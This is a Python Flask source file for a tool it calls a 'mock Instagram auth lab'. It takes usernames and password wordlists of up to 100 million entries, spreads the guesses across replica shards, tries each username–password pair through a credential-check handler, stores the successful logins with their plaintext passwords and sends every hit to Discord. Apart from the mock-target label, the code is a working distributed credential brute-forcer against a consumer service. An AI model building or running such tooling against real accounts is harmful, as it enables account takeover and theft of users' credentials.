"""
MOCKA — Mock Instagram auth lab
Flask app with instaloader traffic routed through mockapis.
Supports streaming wordlists up to 100M, replica sharding, CSV-style TXT.
"""

from __future__ import annotations

import logging
import os
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Iterable, Iterator, Optional

from flask import Flask, jsonify, render_template, request, send_from_directory

from config import config
from discord_notify import notify_hit
from file_processor import password_processor
from instagram_api import instagram_handler
from models import task_manager
from replicas import replica_info

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).resolve().parent

app = Flask(
    __name__,
    static_folder=str(BASE_DIR / "static"),
    template_folder=str(BASE_DIR / "templates"),
)
app.secret_key = config.SECRET_KEY
app.config["MAX_CONTENT_LENGTH"] = config.MAX_FILE_SIZE

os.makedirs(config.UPLOAD_FOLDER, exist_ok=True)


def parse_usernames(raw: str) -> list[str]:
    parts = []
    for chunk in raw.replace("\n", ",").split(","):
        name = chunk.strip().lstrip("@")
        if name:
            parts.append(name)
    seen = set()
    unique = []
    for name in parts:
        key = name.lower()
        if key not in seen:
            seen.add(key)
            unique.append(name)
    return unique


def collect_passwords_from_request():
    """Accept file upload, paste body, or sample wordlist."""
    source = (request.form.get("source") or "upload").strip().lower()

    if source == "sample":
        sample = password_processor.sample_passwords_path()
        if not sample.exists():
            return None, {"success": False, "error": "Sample wordlist missing"}, 500
        result = password_processor.process_password_file(str(sample))
        return result, None, None

    if source == "paste" or (
        request.form.get("passwords") and "passwordFile" not in request.files
    ):
        text = (request.form.get("passwords") or "").strip()
        if not text:
            return None, {"success": False, "error": "Paste at least one password"}, 400
        result = password_processor.process_password_text(text, label="pasted.txt")
        return result, None, None

    if "passwordFile" not in request.files:
        return None, {"success": False, "error": "No password file uploaded"}, 400

    file_storage = request.files["passwordFile"]
    if not file_storage or not file_storage.filename:
        return None, {"success": False, "error": "No file selected"}, 400

    filepath = password_processor.save_uploaded_file(file_storage)
    if not filepath:
        return None, {
            "success": False,
            "error": "Invalid file type. Use .txt, .csv, or .json (comma-separated TXT supported)",
        }, 400

    result = password_processor.process_password_file(filepath)
    if not result["success"]:
        password_processor.cleanup_file(filepath)
        return None, {"success": False, "error": result["error"]}, 400 if result.get("capped") else 500

    result["_filepath"] = filepath
    return result, None, None


def password_source_for_task(task) -> Iterator[str]:
    """Yield passwords for a task (memory list or streamed file)."""
    if task.passwords:
        yield from task.passwords
        return
    path = task.wordlist_path
    if path and os.path.exists(path):
        yield from password_processor.iter_password_file(path)
        return
    return
    yield  # pragma: no cover


@app.route("/")
def index():
    return render_template(
        "index.html",
        app_name=config.APP_NAME,
        tagline=config.APP_TAGLINE,
        replica_id=replica_info.replica_id,
        total_replicas=replica_info.total_replicas,
        replica_label=replica_info.label,
        mock_url=config.MOCK_API_BASE_URL,
        rate_limit=config.INSTAGRAM_RATE_LIMIT,
        max_concurrent=config.MAX_CONCURRENT_CHECKS,
        max_passwords=config.MAX_PASSWORDS,
    )


@app.route("/health")
def health():
    return jsonify(
        {
            "status": "healthy",
            "app": config.APP_NAME,
            "replica_id": replica_info.replica_id,
            "total_replicas": replica_info.total_replicas,
            "replica_label": replica_info.label,
            "target_url": config.MOCK_API_BASE_URL,
            "max_passwords": config.MAX_PASSWORDS,
            "stats": task_manager.stats(),
            "timestamp": datetime.now().isoformat(),
        }
    )


@app.route("/api/meta")
def meta():
    return jsonify(
        {
            "success": True,
            "app": config.APP_NAME,
            "tagline": config.APP_TAGLINE,
            "mock_url": config.MOCK_API_BASE_URL,
            "replica_id": replica_info.replica_id,
            "total_replicas": replica_info.total_replicas,
            "replica_label": replica_info.label,
            "rate_limit": config.INSTAGRAM_RATE_LIMIT,
            "max_concurrent": config.MAX_CONCURRENT_CHECKS,
            "max_passwords": config.MAX_PASSWORDS,
            "stream_threshold": config.STREAM_THRESHOLD,
            "stats": task_manager.stats(),
        }
    )


@app.route("/api/preview", methods=["POST"])
def preview_file():
    try:
        if request.form.get("passwords"):
            result = password_processor.process_password_text(request.form["passwords"])
            return jsonify(
                {
                    "success": result["success"],
                    "password_count": result["password_count"],
                    "filename": result["filename"],
                    "preview": result["passwords"][:8],
                    "capped": result.get("capped", False),
                    "max_passwords": config.MAX_PASSWORDS,
                    "error": result.get("error"),
                }
            )

        if "passwordFile" not in request.files:
            return jsonify({"success": False, "error": "No file uploaded"}), 400

        file_storage = request.files["passwordFile"]
        if not file_storage.filename:
            return jsonify({"success": False, "error": "No file selected"}), 400

        temp_path = os.path.join(
            config.UPLOAD_FOLDER,
            f"temp_{uuid.uuid4()}_{password_processor.sanitize_filename(file_storage.filename)}",
        )
        file_storage.save(temp_path)
        try:
            result = password_processor.preview_file(temp_path)
            return jsonify(
                {
                    "success": result["success"],
                    "password_count": result["password_count"],
                    "filename": result["filename"],
                    "preview": result["preview"],
                    "capped": result.get("capped", False),
                    "stream": result.get("stream", False),
                    "max_passwords": config.MAX_PASSWORDS,
                    "error": result.get("error"),
                }
            )
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
    except Exception as exc:
        logger.exception("Preview error")
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/api/sample")
def sample_wordlist():
    path = password_processor.sample_passwords_path()
    if not path.exists():
        return jsonify({"success": False, "error": "Sample missing"}), 404
    return send_from_directory(path.parent, path.name, as_attachment=True)


@app.route("/api/tasks", methods=["GET"])
def get_tasks():
    try:
        status = (request.args.get("status") or "").strip().lower()
        payloads = task_manager.list_payloads()
        if status:
            payloads = [t for t in payloads if t.get("status") == status]
        return jsonify(
            {
                "success": True,
                "tasks": payloads,
                "count": len(payloads),
                "stats": task_manager.stats(),
                "replica": {
                    "id": replica_info.replica_id,
                    "total": replica_info.total_replicas,
                    "label": replica_info.label,
                },
            }
        )
    except Exception as exc:
        logger.exception("Error getting tasks")
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/api/tasks", methods=["POST"])
def create_task():
    try:
        usernames_raw = (request.form.get("usernames") or "").strip()
        if not usernames_raw:
            return jsonify({"success": False, "error": "Enter at least one username"}), 400

        usernames = parse_usernames(usernames_raw)
        if not usernames:
            return jsonify({"success": False, "error": "No valid usernames provided"}), 400

        stop_on_first = (request.form.get("stop_on_first") or "true").lower() in {
            "1",
            "true",
            "yes",
            "on",
        }

        result, err, code = collect_passwords_from_request()
        if err:
            return jsonify(err), code

        password_count = int(result.get("password_count") or 0)
        passwords = result.get("passwords") or []
        stream = bool(result.get("stream"))
        filepath = result.get("_filepath") or result.get("filepath")

        if password_count <= 0 and not passwords:
            if filepath:
                password_processor.cleanup_file(filepath)
            return jsonify({"success": False, "error": "No passwords found"}), 400

        if password_count > config.MAX_PASSWORDS:
            if filepath:
                password_processor.cleanup_file(filepath)
            return jsonify(
                {
                    "success": False,
                    "error": f"Password cap exceeded (max {config.MAX_PASSWORDS:,})",
                }
            ), 400

        source = (request.form.get("source") or "upload").lower()
        if source not in ("upload", "paste", "sample"):
            source = "paste" if result.get("filename") == "pasted.txt" else "upload"

        shard_total = replica_info.shard_size(password_count)

        task = task_manager.create_task(
            usernames=usernames,
            password_file=result.get("filename") or "passwords.txt",
            passwords=[] if stream else passwords,
            stop_on_first=stop_on_first,
            source=source,
            replica_id=str(replica_info.replica_id),
            replica_index=replica_info.replica_id,
            total_replicas=replica_info.total_replicas,
            wordlist_path=filepath if stream else (filepath if not passwords else None),
            stream=stream or bool(filepath and not passwords),
            password_count=password_count,
            shard_total=shard_total,
        )

        # Keep path for streaming OR for cleanup after in-memory load from upload
        if filepath and not task.wordlist_path and stream:
            task.wordlist_path = filepath
        if filepath and task.stream:
            task.wordlist_path = filepath
        # For in-memory uploads, still keep path for cleanup after run
        cleanup_path = filepath

        task_manager.update_task(task)

        threading.Thread(
            target=process_task_background,
            args=(task.task_id, cleanup_path),
            daemon=True,
        ).start()

        return jsonify(
            {
                "success": True,
                "task_id": task.task_id,
                "message": (
                    f"Started — {password_count:,} passwords × {len(usernames)} usernames "
                    f"(shard {replica_info.label}: {shard_total:,} pw)"
                ),
                "task": task.to_dict(),
            }
        )
    except Exception as exc:
        logger.exception("Error creating task")
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/api/tasks/<task_id>", methods=["GET"])
def get_task(task_id: str):
    task = task_manager.get_task(task_id)
    if task:
        return jsonify({"success": True, "task": task.to_dict()})
    try:
        from task_store import load_snapshot

        snap = load_snapshot(task_id)
        if snap:
            return jsonify({"success": True, "task": snap})
    except Exception:
        pass
    return jsonify({"success": False, "error": "Task not found"}), 404


@app.route("/api/tasks/<task_id>/cancel", methods=["POST"])
def cancel_task(task_id: str):
    task = task_manager.cancel_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    return jsonify({"success": True, "message": "Cancel requested", "task": task.to_dict()})


@app.route("/api/tasks/<task_id>", methods=["DELETE"])
def delete_task(task_id: str):
    task = task_manager.get_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    if task.status in ("pending", "processing"):
        task.cancel_requested = True
        time.sleep(0.05)
    if task.wordlist_path:
        password_processor.cleanup_file(task.wordlist_path)
    elif task.password_file and task.source == "upload":
        file_path = os.path.join(config.UPLOAD_FOLDER, task.password_file)
        password_processor.cleanup_file(file_path)
    task_manager.delete_task(task_id)
    return jsonify({"success": True, "message": "Task deleted"})


@app.route("/api/tasks/clear-finished", methods=["POST"])
def clear_finished():
    removed = task_manager.clear_finished()
    return jsonify({"success": True, "removed": removed, "stats": task_manager.stats()})


@app.route("/api/tasks/<task_id>/export", methods=["GET"])
def export_task(task_id: str):
    task = task_manager.get_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    payload = task.to_dict()
    payload["results"] = task.results
    return jsonify({"success": True, "export": payload})


def process_task_background(task_id: str, filepath: Optional[str]) -> None:
    try:
        time.sleep(0.05)
        task = task_manager.get_task(task_id)
        if not task:
            logger.error("Task %s not found", task_id)
            return

        task.status = "processing"
        task.start_time = datetime.now()
        task.note_progress()
        task.results.append(
            {
                "username": task.usernames[0] if task.usernames else "",
                "password": "***",
                "success": False,
                "message": f"Starting against {config.MOCK_API_BASE_URL}",
                "error_type": "info",
                "timestamp": datetime.now().isoformat(),
            }
        )
        task_manager.update_task(task)

        logger.info(
            "Task %s: %s users × %s passwords | shard %s/%s | stream=%s | via %s",
            task_id,
            len(task.usernames),
            task.global_total // max(1, len(task.usernames)),
            task.replica_index + 1,
            task.total_replicas,
            task.stream,
            config.MOCK_API_BASE_URL,
        )

        stop_all = False
        updates = 0

        for username in task.usernames:
            if stop_all or task.cancel_requested:
                break

            source: Iterable[str]
            if task.passwords:
                source = task.passwords
            elif task.wordlist_path and os.path.exists(task.wordlist_path):
                source = password_processor.iter_password_file(task.wordlist_path)
            elif filepath and os.path.exists(filepath):
                source = password_processor.iter_password_file(filepath)
            else:
                task.error = "Wordlist missing for streamed task"
                break

            for index, password in enumerate(source):
                if task.total_replicas > 1 and index % task.total_replicas != task.replica_index:
                    continue

                live = task_manager.get_task(task_id)
                if not live or live.cancel_requested:
                    task.cancel_requested = True
                    stop_all = True
                    break

                try:
                    result = instagram_handler.check_credentials(username, password)
                    task.progress += 1
                    task.note_progress()

                    entry = {
                        "username": username,
                        "password": password if result.success else "***",
                        "success": result.success,
                        "message": result.message,
                        "error_type": result.error_type,
                        "timestamp": datetime.now().isoformat(),
                    }
                    task.results.append(entry)
                    if len(task.results) > 5000:
                        task.results = task.results[-2000:]

                    if result.success:
                        task.successful_logins.append(
                            {
                                "username": username,
                                "password": password,
                                "profile": result.profile,
                                "timestamp": datetime.now().isoformat(),
                            }
                        )
                        logger.info("HIT %s (mock)", username)
                        notify_hit(username, password, task_id=task_id)
                        if task.stop_on_first:
                            stop_all = True
                    else:
                        task.failed_attempts += 1

                    updates += 1
                    # Always persist so any poll (any container with shared volume) sees state
                    task_manager.update_task(task)
                    if stop_all:
                        break
                except Exception as exc:
                    logger.error("Check failed %s: %s", username, exc)
                    task.failed_attempts += 1
                    task.progress += 1
                    task.note_progress()
                    task.results.append(
                        {
                            "username": username,
                            "password": "***",
                            "success": False,
                            "message": f"Unexpected error: {exc}",
                            "error_type": "unknown_error",
                            "timestamp": datetime.now().isoformat(),
                        }
                    )
                    updates += 1
                    task_manager.update_task(task)

            if stop_all or task.cancel_requested:
                break

        task_manager.update_task(task)

        if task.cancel_requested:
            task.status = "cancelled"
        elif task.error:
            task.status = "failed"
        else:
            task.status = "completed"
        task.end_time = datetime.now()
        task_manager.update_task(task)
        logger.info("Task %s %s — %s hits", task_id, task.status, len(task.successful_logins))

        if filepath:
            password_processor.cleanup_file(filepath)
    except Exception as exc:
        logger.exception("Task %s crashed", task_id)
        task = task_manager.get_task(task_id)
        if task:
            task.status = "failed"
            task.error = str(exc)
            task.end_time = datetime.now()
            task_manager.update_task(task)


if __name__ == "__main__":
    logger.info("Starting %s on %s:%s", config.APP_NAME, config.HOST, config.PORT)
    logger.info("Mock target: %s", config.MOCK_API_BASE_URL)
    logger.info("Replica %s | max passwords %s", replica_info.label, f"{config.MAX_PASSWORDS:,}")
    app.run(host=config.HOST, port=config.PORT, debug=config.DEBUG, threaded=True)
